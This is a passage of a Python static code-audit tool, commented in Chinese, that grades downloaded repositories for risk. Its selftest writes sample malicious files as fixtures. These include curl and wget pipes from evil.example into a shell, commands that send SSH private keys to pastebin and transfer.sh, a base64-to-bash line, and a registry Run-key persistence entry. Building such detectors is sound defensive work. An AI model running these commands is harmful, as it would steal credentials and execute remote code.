def analyse_dir(root: Path):
    root = root.resolve()
    t0 = datetime.now()
    if root.is_file():
        # 也可以直接传单个文件
        scan_root = root.parent
        files, skipped, truncated = [root], [], False
    else:
        scan_root = root
        files, skipped, truncated = collect_files(root)
    findings, file_rows = [], []
    total_bytes = 0
    notes = []

    if skipped:
        notes.append(f"跳过 {len(skipped)} 个目录（.git / node_modules 等），其内容未扫描")
    if truncated:
        notes.append(f"文件数超过 {MAX_FILES}，只扫描了前 {MAX_FILES} 个")

    if not files:
        notes.append("目录是空的，把要审查的代码放进来再跑一次")

    for p in files:
        rel = str(p.relative_to(scan_root)).replace("\\", "/")
        try:
            size = p.stat().st_size
        except OSError:
            size = 0
        total_bytes += size
        head = read_head(p) if not p.is_symlink() else b""
        file_rows.append({
            "path": rel, "size": size, "kind": sniff_kind(head),
            "sha256": sha256_of(p) if size < 64 * 1024 * 1024 else "(large)",
        })
        try:
            scan_file(p, rel, findings)
        except Exception as e:  # 单个文件出错不影响整体
            notes.append(f"扫描 {rel} 时出错：{type(e).__name__}: {e}")

    # .git/config 里的来源信息
    git_cfg = root / ".git" / "config"
    if git_cfg.is_file():
        try:
            m = re.search(r"\[remote \"origin\"\][^\[]*?url\s*=\s*(\S+)",
                          git_cfg.read_text("utf-8", errors="replace"))
            if m:
                notes.append(f"来源仓库：{m.group(1)}")
        except OSError:
            pass

    ded, per_cat = compute_deduction(findings)
    score = 100 - ded
    has_crit = any(f.sev == "critical" for f in findings)
    grade, risk = grade_of(ded, has_crit)

    sev_counts = {}
    for f in findings:
        sev_counts[f.sev] = sev_counts.get(f.sev, 0) + 1

    advice = ADVICE[grade]
    if grade == "A" and findings:
        advice = "只命中了低风险提示，没有需要拦下的行为。建议先看一眼入口文件再决定是否直接打开。"

    return {
        "root": str(root),
        "file_count": len(files),
        "total_mb": total_bytes / 1048576,
        "score": score,
        "deduction": ded,
        "per_category": per_cat,
        "grade": grade,
        "risk": risk,
        "advice": advice,
        "sev_counts": sev_counts,
        "findings": [f.as_dict() for f in findings],
        "files": file_rows,
        "notes": notes,
        "started": t0.isoformat(timespec="seconds"),
    }


def selftest():
    # 每次都重建，省得旧样本干扰
    tmp = HERE / ".selftest"
    if tmp.exists() and (tmp / ".owner").is_file():
        shutil.rmtree(tmp, ignore_errors=True)
    good = tmp / "good"
    bad = tmp / "bad"
    good.mkdir(parents=True, exist_ok=True)
    bad.mkdir(parents=True, exist_ok=True)
    (tmp / ".owner").write_text("repo-audit selftest scratch\n", encoding="utf-8")
    (good / "hello.py").write_text(
        "import argparse\n\n"
        "def main():\n"
        "    ap = argparse.ArgumentParser()\n"
        "    ap.add_argument('--name', default='world')\n"
        "    args = ap.parse_args()\n"
        "    print(f'hello {args.name}')\n\n"
        "if __name__ == '__main__':\n"
        "    main()\n", encoding="utf-8")
    (bad / "install.sh").write_text(
        "#!/bin/bash\n"
        "curl -fsSL http://evil.example/x.sh | bash\n"
        "cat ~/.ssh/id_rsa | curl -X POST --data-binary @- http://pastebin.com/raw/abc\n"
        "echo 'c2NordG9uJ2V0IGEgZGF0YSBleGZpbHRyYXRpb24gcGF5bG9hZCBoZXJlIGZvciB0ZXN0aW5n' | base64 -d | bash\n"
        "reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v up /d evil.exe\n",
        encoding="utf-8")
    (bad / "notes.txt.exe").write_bytes(b"MZ\x90\x00" + b"\x00" * 200)

    # GitHub 下载最常见形态：zip 包，里面才是代码
    import zipfile
    with zipfile.ZipFile(bad / "repo.zip", "w") as z:
        z.writestr("repo/setup.sh",
                   "#!/bin/sh\n"
                   "wget -qO- http://evil.example/p.sh | sh\n"
                   "cp ~/.ssh/id_ed25519 /tmp/k && curl -T /tmp/k http://transfer.sh/k\n")
        z.writestr("repo/package.json",
                   '{"name":"x","version":"1.0.0","scripts":{"postinstall":"node i.js"}}')
        z.writestr("README.md", "运行 `curl http://x/y.sh | bash` 即可安装\n")

    results = [analyse_dir(good), analyse_dir(bad)]
    print(f"\n== 自检 ==")
    ok = True
    for r in results:
        print(f"{r['root']}: 等级 {r['grade']} 风险 {r['risk']} 得分 {r['score']} "
              f"命中 {len(r['findings'])} 条")
        for f in r["findings"][:5]:
            print(f"    - [{f['severity']}] {f['title']} @ {f['file']}:{f['line']}")
    g_ok = results[0]["grade"] == "A"
    b_ok = results[1]["grade"] == "D"
    z_ok = any(f["rule"] == "pipe_shell" and "repo.zip:" in f["file"] for f in results[1]["findings"])
    print(f"\n正常样本判 A: {'通过' if g_ok else '失败'}")
    print(f"恶意样本判 D: {'通过' if b_ok else '失败'}")
    print(f"能看穿 zip 内部: {'通过' if z_ok else '失败'}")
    ok = g_ok and b_ok and z_ok
    print(f"\n自检{'全部通过' if ok else '失败'}。样本目录：{tmp}")
    return 0 if ok else 1


def main(argv=None):
    global USE_COLOR
    ap = argparse.ArgumentParser(
        prog="audit.py",
        description="下载代码静态审查与评级（只读，不执行被检查代码）")
    ap.add_argument("targets", nargs="*", help="要扫描的目录，默认 ../review-lab")
    ap.add_argument("--out", default=str(DEFAULT_OUT), help="报告输出目录")
    ap.add_argument("--json-only", action="store_true", help="只写 JSON，不打印摘要")
    ap.add_argument("--no-color", action="store_true", help="禁用彩色输出")
    ap.add_argument("--selftest", action="store_true", help="运行自检并退出")
    args = ap.parse_args(argv)

    for stream in (sys.stdout, sys.stderr):
        try:
            stream.reconfigure(encoding="utf-8", errors="replace")
        except Exception:
            pass

    USE_COLOR = (not args.no_color) and enable_ansi() and not args.json_only

    if args.selftest:
        return selftest()

    targets = [Path(t) for t in args.targets] or [DEFAULT_TARGET]
    missing = [str(t) for t in targets if not t.exists()]
    if missing:
        print(f"路径不存在: {', '.join(missing)}", file=sys.stderr)
        return 3

    results = [analyse_dir(t) for t in targets]
    generated = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    out_dir = Path(args.out)
    out_dir.mkdir(parents=True, exist_ok=True)
    stamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    md_path = out_dir / f"审查报告-{stamp}.md"
    js_path = out_dir / f"审查报告-{stamp}.json"
    md_path.write_text(render_markdown(results, generated), encoding="utf-8")
    js_path.write_text(json.dumps({
        "tool": f"{APP_NAME} {APP_VER}", "generated": generated, "results": results,
    }, ensure_ascii=False, indent=2), encoding="utf-8")

    if not args.json_only:
        render_console(results, None, ", ".join(str(t) for t in targets))
        print(f"Markdown: {md_path}")
        print(f"JSON    : {js_path}\n")

    worst = min((r["grade"] for r in results), default="A")
    return {"A": 0, "B": 0, "C": 1, "D": 2}.get(worst, 0)


if __name__ == "__main__":
    sys.exit(main())
